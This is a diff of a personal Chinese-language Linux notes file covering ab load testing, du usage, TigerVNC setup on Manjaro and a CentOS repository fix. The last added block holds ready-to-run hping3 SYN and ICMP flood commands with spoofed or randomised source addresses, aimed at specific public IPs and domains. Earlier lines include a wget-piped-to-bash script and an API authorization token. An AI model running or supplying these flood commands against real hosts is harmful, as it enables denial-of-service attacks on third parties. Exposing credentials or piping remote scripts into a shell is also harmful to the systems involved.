@@ -471,7 +471,7 @@ sudo /etc/init.d/apache2 restart
 -n:请求次数
 
 ```bash
-ab -c 127 -n 2000 demo.com/
+ab -c 100 -n 10000 demo.com/ # 模拟 100 个用户发起 10000 次请求
 ab -c 127 -n 1000 -H "Authorization: 4d43fe0c86c9d21019389678def79da2&6&1621665729" http://wanyin.heimeiai.com/api/exam/cate/list?cid=11
 ```
 
@@ -548,7 +548,7 @@ Percentage of the requests served within a certain time (ms)
   95%  30081
   98%  30610
   99%  31703
- 100%  55634 (longest request)
+ 100%  55634 (longest request) 最长请求时间
 
 ```
 
@@ -558,6 +558,217 @@ Percentage of the requests served within a certain time (ms)
 tail -f path/filename.txt
 ```
 
+# linux文件清理
+
+## 查看当前目录下的文件磁盘占用
+
+```bash
+ du -lh --max-depth=1
+ ---------------------------
+8.0K    ./mailhog
+12K     ./frp
+260K    ./.git
+8.0K    ./aria2
+8.0K    ./panindex
+8.0K    ./elasticsearch
+8.0K    ./alist
+8.0K    ./redis
+28K     ./minioCluster
+8.0K    ./cloudreve
+8.0K    ./nextcloud
+2.3G    ./meilisearch
+```
+
+# Linux查看文件或文件夹大小: du命令
+
+du命令用于显示目录或文件的大小。
+du会显示指定的目录或文件所占用的磁盘空间。
+
+语法：
+
+```python
+du [-abcDhHklmsSx][-L <符号连接>][-X <文件>][--block-size][--exclude=<目录或文件>][--max-depth=<目录层数>][--help][--version][目录或文件]
+```
+
+常用参数说明：
+-a或-all 显示目录中个别文件的大小。
+
+-b或-bytes 显示目录或文件大小时，以byte为单位。
+
+-c或--total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。
+
+-D或--dereference-args 显示指定符号连接的源文件大小。
+
+-h或--human-readable 以K，M，G为单位，提高信息的可读性。
+
+-H或--si 与-h参数相同，但是K，M，G是以1000为换算单位。
+
+-k或--kilobytes 以1024 bytes为单位。
+
+-l或--count-links 重复计算硬件连接的文件。
+
+-L<符号连接>或--dereference<符号连接> 显示选项中所指定符号连接的源文件大小。
+
+-m或--megabytes 以1MB为单位。
+
+-s或--summarize 仅显示总计。
+
+-S或--separate-dirs 显示个别目录的大小时，并不含其子目录的大小。
+
+-x或--one-file-xystem 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。
+
+-X<文件>或--exclude-from=<文件> 在<文件>指定目录或文件。
+
+--exclude=<目录或文件> 略过指定的目录或文件。
+
+--max-depth=<目录层数> 超过指定层数的目录后，予以忽略。
+
+--help 显示帮助。
+
+--version 显示版本信息。
+
+
+使用实例：
+1、查看当前目录总共占的容量，而不单独列出各子项占用的容量 ，在所在目录输入du -sh：
+
+```python
+# du -sh
+
+15G
+```
+
+2、查看当前目录下一级子文件和子目录占用的磁盘容量：
+
+```python
+# du -lh --max-depth=1
+
+13M    ./.cache
+0    ./.config
+1.2M    ./mongo-hacker
+0    ./.pki
+14M    .
+```
+
+3、统计当前文件夹(目录)大小，并按文件大小排序：
+统计当前文件夹(目录)大小：du -sh *
+
+```python
+# du -sh * | sort -n
+
+1.2M    mongo-hacker
+4.0K    anaconda-ks.cfg
+4.0K    installmongofor3.6.log
+4.0K    securityforcs7.log
+4.0K    security.log
+16K    securityforcs7.py
+24K    installmongofor3.6.py
+```
+
+4、查看指定文件大小可以使用du -sh或du -a：
+
+```python
+# du -sh installmongofor3.6.log
+
+4.0K    installmongofor3.6.log
+```
+
+5、列出当前目录中的目录名不包括某字符串的目录的总大小：
+
+```python
+# du -sh --exclude='installmongofor3.6.log'
+
+14M
+```
+
+# window连接manjaro桌面
+
+## window
+
+下载安装包：[https://www.realvnc.com/en/connect/download/viewer/](https://www.realvnc.com/en/connect/download/viewer/) 
+
+## manjaro
+
+一、安装tigervnc
+
+```bash
+sudo pacman -S tigervnc
+```
+
+ 二、配置
+
+​    2.1 设置连接密码（桌面仅显示密码可以不设置）
+
+```bash
+vncpasswd
+```
+
+​     2.2 添加连接用户
+
+```
+sudo vim /etc/tigervnc/vncserver.users
+```
+
+#添加用户名，例如 user，多个用户依次数字排列添加。
+
+```
+:1=user
+:2=user2
+```
+
+> 端口 :1 是 TCP 端口 5901 (5900+1)，:2是+2，5902
+
+​    2.3 vnc配置文件
+
+查看桌面环境，我下的是xfce
+
+```bash
+cd /usr/share/xsessions/
+
+----------
+➜  cd /usr/share/xsessions/
+➜  xsessions ls
+gnome-classic-xorg.desktop  gnome-classic.desktop  gnome-xorg.desktop  gnome.desktop
+➜  xsessions
+```
+
+添加  vnc 配置
+
+```bash
+sudo vim ~/.vnc/config
+```
+
+```
+#添加以下内容，建议屏蔽localhost
+session=gnome // 我上面看到的gnome ,所以这里填了gnome，如果你的是xfce，那么久填xfce
+geometry=1920x1080
+#localhost
+alwaysshared
+```
+
+
+
+三、启动
+
+```bash
+systemctl enable vncserver@:1.service        #开机自启
+
+systemctl start vncserver@:1.service           #启动vnc
+
+systemctl status vncserver@:1.service         #查看vnc
+
+systemctl stop vncserver@:1.service           #关闭vnc
+```
+
+这里启动的时候需要输入你上面设置的密码
+
+ 
+
+四、win10连接
+
+vnc viewer连接ip 192.168.3.40:5901即可
+
+![image-20220725100100564](Tool.assets/image-20220725100100564.png) 
+
 ## 软件：
 
 https://aur.archlinux.org/packages/icalingua/
@@ -566,5 +777,41 @@ https://aur.archlinux.org/packages/icalingua/
 
 ```bash
 wget -qO- https://raw.githubusercontent.com/littleplus/TencentAgentRemove/master/remove.sh | bash
+```
+
+## Error: Failed to download metadata for repo ‘appstream’ – CentOS 8
+
+```bash
+dnf --disablerepo '*' --enablerepo=extras swap centos-linux-repos centos-stream-repos
+
+dnf distro-sync
+```
+
+```bash
+hping3 -q -n -a 攻击ip -S -s 源端口  --keep -p 目的端口  --flood  被攻击IP 
+
+
+hping3 -q -n -a 192.168.3.200 -S -s 80  --keep -p 80  --flood  1.14.63.64
+
+
+hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source mip.jdidi.cn
+
+sudo hping3 --flood  -S 1.14.63.64 -p 80 -i u1000
+
+sudo hping3 --flood -S  1.14.63.64
+
+sudo hping3 1.14.63.64 -c 10000 -d 10000 -S -w 64 -p 80 --flood 
+
+目标地址
+sudo hping3 -c 999999999 -d 150 -S -w 64 -p 80 -i u1000 220.170.186.139
+
+万引 103.47.81.249
+sudo hping3 -c 999999999 -d 150 -S -w 64 -p 80 -i u1000  103.47.81.249
+
+测试
+sudo hping3 -c 999999999 -d 150 -S -w 64 -p 8082 -i u1000 1.14.63.64
+
+sudo hping3 --tcp-connect --rate=90000 -c 900000 -q 1.14.63.64
+sudo  hping3 -c 10000 -d 120 --icmp -w 64 -p 80 -i u1000 --flood --rand-sourcet 1.14.63.64
 ```
 
